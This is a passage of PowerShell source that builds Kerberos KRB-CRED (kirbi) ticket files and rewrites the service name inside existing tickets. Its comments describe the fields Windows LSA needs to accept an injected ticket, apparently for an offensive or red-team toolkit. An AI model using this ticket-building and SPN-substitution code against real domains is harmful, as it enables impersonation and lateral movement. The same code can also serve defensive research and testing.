            Write-Verbose "[Update-KRBCredSName] Replaced sname [9] in KrbCredInfo: $($fieldRaw.Length) bytes -> $($newSnameField9.Length) bytes"
        } else {
            # Preserve all other fields as raw bytes
            $newCredInfoContent.AddRange($fieldRaw)
        }

        $ciPos += $fieldLen
    }

    # Rebuild: KrbCredInfo SEQUENCE -> SEQUENCE OF -> [0] ticket-info -> EncKrbCredPart SEQUENCE -> APPLICATION 29
    $newCredInfoSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newCredInfoContent.ToArray()))
    $newTicketInfoSeq = [byte[]](New-ASN1Sequence -Data $newCredInfoSeq)
    $newTicketInfoField = [byte[]](New-ASN1ContextTag -Tag 0 -Data $newTicketInfoSeq)
    $newApp29Seq = [byte[]](New-ASN1Sequence -Data $newTicketInfoField)
    $newApp29 = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $newApp29Seq)

    # Rebuild EncryptedData
    $newEncDataContent = New-Object System.Collections.Generic.List[byte]
    $edRebuildPos = 0
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edFieldLen = $encDataChildren[$i].TotalLength
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - wrap new EncKrbCredPart in OCTET STRING
            $newEncDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $newApp29)))
        } else {
            # Preserve other fields (etype, kvno) as raw bytes
            $rawField = [byte[]]$encDataSeqContent[$edRebuildPos..($edRebuildPos + $edFieldLen - 1)]
            $newEncDataContent.AddRange($rawField)
        }
        $edRebuildPos += $edFieldLen
    }
    $newEncDataSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataContent.ToArray()))
    $newEncPartField = [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncDataSeq)

    # =====================================================
    # Part 4: Reassemble KRB-CRED
    # =====================================================
    $newSeqContent = New-Object System.Collections.Generic.List[byte]
    $newSeqContent.AddRange([byte[]]$childRawBytes[0])   # [0] pvno - original
    $newSeqContent.AddRange([byte[]]$childRawBytes[1])   # [1] msg-type - original
    $newSeqContent.AddRange([byte[]]$newTicketsField)     # [2] tickets - modified sname
    $newSeqContent.AddRange([byte[]]$newEncPartField)     # [3] enc-part - modified sname [9]

    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqContent.ToArray()))
    $newKrbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $newSeq)

    Write-Verbose "[Update-KRBCredSName] SPN substituted: $NewServiceType/$hostName (original: $($KRBCredBytes.Length) bytes, new: $($newKrbCred.Length) bytes)"

    return $newKrbCred
}

function Build-KRBCred {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Ticket,

        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$Realm,

        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [string]$ServerName = "krbtgt",

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$false)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$false)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    # Default times if not provided
    $now = [datetime]::UtcNow
    if (-not $AuthTime) { $AuthTime = $now }
    if (-not $StartTime) { $StartTime = $now }
    if (-not $EndTime) { $EndTime = $now.AddHours(10) }
    if (-not $RenewTill) { $RenewTill = $now.AddDays(7) }

    # Default flags if not provided: forwardable (bit 1) + renewable (bit 8) + initial (bit 9) + pre-authent (bit 10)
    # 0x50800000 = these standard TGT flags
    if (-not $TicketFlags -or $TicketFlags.Length -ne 4) {
        $TicketFlags = [byte[]]@(0x50, 0x80, 0x00, 0x00)
    }

    $realmUpper = $Realm.ToUpper()

    # EncryptionKey
    # EncryptionKey ::= SEQUENCE { keytype [0] INT32, keyvalue [1] OCTET STRING }
    $keyContent = New-Object System.Collections.Generic.List[byte]
    $keyContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)))
    $keyContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $SessionKey)))
    $encKey = New-ASN1Sequence -Data ([byte[]]$keyContent.ToArray())

    # KrbCredInfo ::= SEQUENCE {
    #   key [0] EncryptionKey,
    #   prealm [1] Realm OPTIONAL,
    #   pname [2] PrincipalName OPTIONAL,
    #   flags [3] TicketFlags OPTIONAL,
    #   authtime [4] KerberosTime OPTIONAL,
    #   starttime [5] KerberosTime OPTIONAL,
    #   endtime [6] KerberosTime OPTIONAL,
    #   renew-till [7] KerberosTime OPTIONAL,
    #   srealm [8] Realm OPTIONAL,
    #   sname [9] PrincipalName OPTIONAL
    # }
    $credInfoContent = New-Object System.Collections.Generic.List[byte]

    # [0] key
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data $encKey))

    # [1] prealm (client realm)
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $realmUpper)))

    # [2] pname (client principal)
    $cnameContent = New-Object System.Collections.Generic.List[byte]
    $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
    $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ClientName))))
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray()))))

    # [3] flags - use provided flags from EncKDCRepPart (critical for LSA acceptance)
    # $TicketFlags already validated/defaulted at parameter binding
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 3 -Data (New-ASN1BitString -Value $TicketFlags)))

    # [4] authtime - required by Windows LSA for ticket acceptance
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 4 -Data (New-ASN1GeneralizedTime -Value $AuthTime)))

    # [5] starttime
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $StartTime)))

    # [6] endtime
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 6 -Data (New-ASN1GeneralizedTime -Value $EndTime)))

    # [7] renew-till
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 7 -Data (New-ASN1GeneralizedTime -Value $RenewTill)))

    # [8] srealm (server realm)
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 8 -Data (New-ASN1GeneralString -Value $realmUpper)))

    # [9] sname (server principal) - krbtgt/REALM for TGT
    $snameContent = New-Object System.Collections.Generic.List[byte]
    if ($ServerInstance) {
        # NT-SRV-INST (2) - krbtgt/REALM
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)))
        # Build name sequence with List to avoid Object[] from concatenation
        $nameSeq = New-Object System.Collections.Generic.List[byte]
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServerName))
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServerInstance))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data ([byte[]]$nameSeq.ToArray()))))
    } else {
        # NT-PRINCIPAL (1) - just service name
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ServerName))))
    }
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 9 -Data (New-ASN1Sequence -Data ([byte[]]$snameContent.ToArray()))))

    $krbCredInfo = New-ASN1Sequence -Data ([byte[]]$credInfoContent.ToArray())

    # EncKrbCredPart ::= [APPLICATION 29] SEQUENCE { ticket-info [0] SEQUENCE OF KrbCredInfo }
    $encKrbCredPartContent = [byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Sequence -Data $krbCredInfo))
    $encKrbCredPartSeq = [byte[]](New-ASN1Sequence -Data $encKrbCredPartContent)
    $encKrbCredPart = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $encKrbCredPartSeq)

    # EncryptedData for enc-part (unencrypted, etype 0 - standard for local kirbi files)
    # EncryptedData ::= SEQUENCE { etype [0] INT32, kvno [1] UInt32 OPTIONAL, cipher [2] OCTET STRING }
    $encDataContent = New-Object System.Collections.Generic.List[byte]
    $encDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 0)))  # etype 0 = no encryption
    $encDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $encKrbCredPart)))  # cipher
    $encData = [byte[]](New-ASN1Sequence -Data ([byte[]]$encDataContent.ToArray()))

    # KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    #   pvno [0] INTEGER (5),
    #   msg-type [1] INTEGER (22),
    #   tickets [2] SEQUENCE OF Ticket,
    #   enc-part [3] EncryptedData
    # }
    $krbCredContent = New-Object System.Collections.Generic.List[byte]
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)))   # pvno
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 22)))  # msg-type (KRB-CRED)
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $Ticket)))  # tickets
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 3 -Data $encData))  # enc-part

    $krbCredSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$krbCredContent.ToArray()))
    $krbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $krbCredSeq)

    return $krbCred
}

#endregion
